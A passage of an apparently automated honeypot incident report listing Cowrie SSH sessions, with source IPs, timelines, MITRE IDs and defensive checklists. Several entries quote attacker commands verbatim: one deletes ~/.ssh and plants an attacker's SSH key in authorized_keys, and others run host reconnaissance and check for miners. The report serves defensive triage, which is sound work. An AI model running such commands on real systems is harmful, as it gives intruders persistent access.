**Recommended Actions:**
- [ ] Submit `35.240.24[.]252` to AbuseIPDB if not already reported
- [ ] Block `35.240.24[.]252` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55714714171a

| Field | Detail |
|---|---|
| **Source IP** | `103.200.22[.]154` |
| **First Seen** | 2026-08-01 07:09 |
| **Last Seen** | 2026-08-01 07:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:09:32` | `cowrie.session.connect` |
| `2026-08-01 07:09:32` | `cowrie.client.version` |
| `2026-08-01 07:09:33` | `cowrie.client.kex` |
| `2026-08-01 07:09:34` | `cowrie.login.success` |
| `2026-08-01 07:09:35` | `cowrie.session.params` |
| `2026-08-01 07:09:35` | `cowrie.command.input` |
| `2026-08-01 07:09:35` | `cowrie.command.failed` |
| `2026-08-01 07:09:35` | `cowrie.log.closed` |
| `2026-08-01 07:09:36` | `cowrie.session.params` |
| `2026-08-01 07:09:36` | `cowrie.command.input` |
| `2026-08-01 07:09:36` | `cowrie.session.file_download` |
| `2026-08-01 07:09:36` | `cowrie.log.closed` |
| `2026-08-01 07:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.22[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.200.22[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1146eeb6bbde

| Field | Detail |
|---|---|
| **Source IP** | `103.200.22[.]154` |
| **First Seen** | 2026-08-01 07:09 |
| **Last Seen** | 2026-08-01 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:09:36` | `cowrie.session.connect` |
| `2026-08-01 07:09:36` | `cowrie.client.version` |
| `2026-08-01 07:09:37` | `cowrie.client.kex` |
| `2026-08-01 07:09:38` | `cowrie.login.success` |
| `2026-08-01 07:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.22[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.200.22[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49d217afe798

| Field | Detail |
|---|---|
| **Source IP** | `103.200.22[.]154` |
| **First Seen** | 2026-08-01 07:09 |
| **Last Seen** | 2026-08-01 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:09:38` | `cowrie.session.connect` |
| `2026-08-01 07:09:38` | `cowrie.client.version` |
| `2026-08-01 07:09:39` | `cowrie.client.kex` |
| `2026-08-01 07:09:40` | `cowrie.login.success` |
| `2026-08-01 07:09:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.22[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.200.22[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e78caf7190

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-01 07:10 |
| **Last Seen** | 2026-08-01 07:10 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:10:12` | `cowrie.session.connect` |
| `2026-08-01 07:10:13` | `cowrie.client.version` |
| `2026-08-01 07:10:13` | `cowrie.client.kex` |
| `2026-08-01 07:10:19` | `cowrie.login.success` |
| `2026-08-01 07:10:25` | `cowrie.session.params` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:25` | `cowrie.command.success` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:25` | `cowrie.command.input` |
| `2026-08-01 07:10:26` | `cowrie.log.closed` |
| `2026-08-01 07:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e4561c45849

| Field | Detail |
|---|---|
| **Source IP** | `101.36.228[.]201` |
| **First Seen** | 2026-08-01 07:10 |
| **Last Seen** | 2026-08-01 07:12 |
| **Session Duration** | 116s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:10:34` | `cowrie.session.connect` |
| `2026-08-01 07:10:34` | `cowrie.client.version` |
| `2026-08-01 07:10:34` | `cowrie.client.kex` |
| `2026-08-01 07:10:35` | `cowrie.login.success` |
| `2026-08-01 07:12:29` | `cowrie.session.file_upload` |
| `2026-08-01 07:12:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.228[.]201` to AbuseIPDB if not already reported
- [ ] Block `101.36.228[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6342694a080b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-01 07:13 |
| **Last Seen** | 2026-08-01 07:13 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:13:14` | `cowrie.session.connect` |
| `2026-08-01 07:13:14` | `cowrie.client.version` |
| `2026-08-01 07:13:14` | `cowrie.client.kex` |
| `2026-08-01 07:13:21` | `cowrie.login.success` |
| `2026-08-01 07:13:25` | `cowrie.session.params` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:25` | `cowrie.command.success` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:25` | `cowrie.command.input` |
| `2026-08-01 07:13:26` | `cowrie.log.closed` |
| `2026-08-01 07:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27b31e418f3f

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-01 07:16 |
| **Last Seen** | 2026-08-01 07:16 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:16:03` | `cowrie.session.connect` |
| `2026-08-01 07:16:05` | `cowrie.client.version` |
| `2026-08-01 07:16:05` | `cowrie.client.kex` |
| `2026-08-01 07:16:13` | `cowrie.login.success` |
| `2026-08-01 07:16:16` | `cowrie.session.params` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:16` | `cowrie.command.success` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:16` | `cowrie.command.input` |
| `2026-08-01 07:16:18` | `cowrie.log.closed` |
| `2026-08-01 07:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be82296ba67e

| Field | Detail |
|---|---|
| **Source IP** | `218.200.9[.]182` |
| **First Seen** | 2026-08-01 07:17 |
| **Last Seen** | 2026-08-01 07:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:17:54` | `cowrie.session.connect` |
| `2026-08-01 07:17:55` | `cowrie.client.version` |
| `2026-08-01 07:17:55` | `cowrie.client.kex` |
| `2026-08-01 07:17:57` | `cowrie.login.success` |
| `2026-08-01 07:17:57` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.200.9[.]182` to AbuseIPDB if not already reported
- [ ] Block `218.200.9[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d259ee0afd81

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-08-01 07:18 |
| **Last Seen** | 2026-08-01 07:19 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:18:57` | `cowrie.session.connect` |
| `2026-08-01 07:18:59` | `cowrie.client.version` |
| `2026-08-01 07:18:59` | `cowrie.client.kex` |
| `2026-08-01 07:19:10` | `cowrie.login.success` |
| `2026-08-01 07:19:16` | `cowrie.session.params` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:16` | `cowrie.command.success` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:16` | `cowrie.command.input` |
| `2026-08-01 07:19:18` | `cowrie.log.closed` |
| `2026-08-01 07:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0972fad734ef

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-08-01 07:23 |
| **Last Seen** | 2026-08-01 07:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:23:25` | `cowrie.session.connect` |
| `2026-08-01 07:23:25` | `cowrie.client.version` |
| `2026-08-01 07:23:25` | `cowrie.client.kex` |
| `2026-08-01 07:23:27` | `cowrie.login.success` |
| `2026-08-01 07:23:27` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1505848cbfac

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]61` |
| **First Seen** | 2026-08-01 07:23 |
| **Last Seen** | 2026-08-01 07:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:23:33` | `cowrie.session.connect` |
| `2026-08-01 07:23:34` | `cowrie.client.version` |
| `2026-08-01 07:23:34` | `cowrie.client.kex` |
| `2026-08-01 07:23:36` | `cowrie.login.success` |
| `2026-08-01 07:23:37` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]61` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79030fe1db0a

| Field | Detail |
|---|---|
| **Source IP** | `220.246.41[.]171` |
| **First Seen** | 2026-08-01 07:25 |
| **Last Seen** | 2026-08-01 07:25 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:25:39` | `cowrie.session.connect` |
| `2026-08-01 07:25:40` | `cowrie.client.version` |
| `2026-08-01 07:25:40` | `cowrie.client.kex` |
| `2026-08-01 07:25:45` | `cowrie.login.success` |
| `2026-08-01 07:25:46` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:25:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.41[.]171` to AbuseIPDB if not already reported
- [ ] Block `220.246.41[.]171` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c245dbedf2

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-08-01 07:25 |
| **Last Seen** | 2026-08-01 07:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:25:52` | `cowrie.session.connect` |
| `2026-08-01 07:25:52` | `cowrie.client.version` |
| `2026-08-01 07:25:52` | `cowrie.client.kex` |
| `2026-08-01 07:25:55` | `cowrie.login.success` |
| `2026-08-01 07:25:55` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d19372af82b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 07:28 |
| **Last Seen** | 2026-08-01 07:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:28:37` | `cowrie.session.connect` |
| `2026-08-01 07:28:37` | `cowrie.client.version` |
| `2026-08-01 07:28:37` | `cowrie.client.kex` |
| `2026-08-01 07:28:38` | `cowrie.login.success` |
| `2026-08-01 07:28:38` | `cowrie.direct-tcpip.request` |
| `2026-08-01 07:28:38` | `cowrie.direct-tcpip.data` |
| `2026-08-01 07:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca4a73abca68

| Field | Detail |
|---|---|
| **Source IP** | `191.180.161[.]164` |
| **First Seen** | 2026-08-01 07:28 |
| **Last Seen** | 2026-08-01 07:29 |
| **Session Duration** | 58s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:28:44` | `cowrie.session.connect` |
| `2026-08-01 07:28:44` | `cowrie.client.version` |
| `2026-08-01 07:28:44` | `cowrie.client.kex` |
| `2026-08-01 07:28:46` | `cowrie.login.failed` |
| `2026-08-01 07:28:47` | `cowrie.login.success` |
| `2026-08-01 07:28:48` | `cowrie.session.params` |
| `2026-08-01 07:28:48` | `cowrie.command.input` |
| `2026-08-01 07:28:48` | `cowrie.command.failed` |
| `2026-08-01 07:28:48` | `cowrie.log.closed` |
| `2026-08-01 07:28:49` | `cowrie.session.params` |
| `2026-08-01 07:28:49` | `cowrie.command.input` |
| `2026-08-01 07:28:50` | `cowrie.log.closed` |
| `2026-08-01 07:28:50` | `cowrie.session.params` |
| `2026-08-01 07:28:50` | `cowrie.command.input` |
| `2026-08-01 07:28:51` | `cowrie.log.closed` |
| `2026-08-01 07:28:51` | `cowrie.session.params` |
| `2026-08-01 07:28:51` | `cowrie.command.input` |
| `2026-08-01 07:28:52` | `cowrie.log.closed` |
| `2026-08-01 07:28:52` | `cowrie.session.params` |
| `2026-08-01 07:28:52` | `cowrie.command.input` |
| `2026-08-01 07:28:53` | `cowrie.log.closed` |
| `2026-08-01 07:28:53` | `cowrie.session.params` |
| `2026-08-01 07:28:53` | `cowrie.command.input` |
| `2026-08-01 07:28:54` | `cowrie.log.closed` |
| `2026-08-01 07:28:54` | `cowrie.session.params` |
| `2026-08-01 07:28:54` | `cowrie.command.input` |
| `2026-08-01 07:28:55` | `cowrie.log.closed` |
| `2026-08-01 07:28:56` | `cowrie.session.params` |
| `2026-08-01 07:28:56` | `cowrie.command.input` |
| `2026-08-01 07:28:56` | `cowrie.log.closed` |
| `2026-08-01 07:28:57` | `cowrie.session.params` |
| `2026-08-01 07:28:57` | `cowrie.command.input` |
| `2026-08-01 07:28:57` | `cowrie.log.closed` |
| `2026-08-01 07:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.180.161[.]164` to AbuseIPDB if not already reported
- [ ] Block `191.180.161[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-529ce8ceacf5

| Field | Detail |
|---|---|
| **Source IP** | `211.38.183[.]218` |
| **First Seen** | 2026-08-01 07:31 |
| **Last Seen** | 2026-08-01 07:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:31:11` | `cowrie.session.connect` |
| `2026-08-01 07:31:11` | `cowrie.client.version` |
| `2026-08-01 07:31:11` | `cowrie.client.kex` |
| `2026-08-01 07:31:12` | `cowrie.login.success` |
| `2026-08-01 07:31:13` | `cowrie.session.params` |
| `2026-08-01 07:31:13` | `cowrie.command.input` |
| `2026-08-01 07:31:13` | `cowrie.command.failed` |
| `2026-08-01 07:31:13` | `cowrie.log.closed` |
| `2026-08-01 07:31:14` | `cowrie.session.params` |
| `2026-08-01 07:31:14` | `cowrie.command.input` |
| `2026-08-01 07:31:14` | `cowrie.session.file_download` |
| `2026-08-01 07:31:14` | `cowrie.log.closed` |
| `2026-08-01 07:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.38.183[.]218` to AbuseIPDB if not already reported
- [ ] Block `211.38.183[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca8aaeba7104

| Field | Detail |
|---|---|
| **Source IP** | `211.38.183[.]218` |
| **First Seen** | 2026-08-01 07:31 |
| **Last Seen** | 2026-08-01 07:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:31:15` | `cowrie.session.connect` |
| `2026-08-01 07:31:15` | `cowrie.client.version` |
| `2026-08-01 07:31:15` | `cowrie.client.kex` |
| `2026-08-01 07:31:16` | `cowrie.login.success` |
| `2026-08-01 07:31:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.38.183[.]218` to AbuseIPDB if not already reported
- [ ] Block `211.38.183[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8ebed3b317e

| Field | Detail |
|---|---|
| **Source IP** | `211.38.183[.]218` |
| **First Seen** | 2026-08-01 07:31 |
| **Last Seen** | 2026-08-01 07:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 07:31:16` | `cowrie.session.connect` |
| `2026-08-01 07:31:16` | `cowrie.client.version` |
| `2026-08-01 07:31:16` | `cowrie.client.kex` |
| `2026-08-01 07:31:17` | `cowrie.login.success` |
| `2026-08-01 07:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.38.183[.]218` to AbuseIPDB if not already reported
- [ ] Block `211.38.183[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6382ae8a44c1

| Field | Detail |
|---|---|
| **Source IP** | `115.190.64[.]245` |
| **First Seen** | 2026-08-01 07:42 |
| **Last Seen** | 2026-08-01 07:42 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
